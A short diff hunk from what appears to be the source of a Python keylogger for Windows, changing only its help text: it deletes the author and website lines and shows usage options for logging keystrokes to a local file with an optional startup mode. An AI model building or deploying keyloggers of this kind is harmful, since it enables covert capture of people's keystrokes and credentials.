@@ -32,8 +32,8 @@ def hide():
 
 def msg():
     print """\n \nXenotix Python Keylogger for Windows
-Coder: Ajin Abraham <ajin25@gmail.com>
-OPENSECURITY.IN
+
+
 usage:xenotix_python_logger.py mode [optional:startup]
 mode:
      local: store the logs in a file [keylogs.txt]
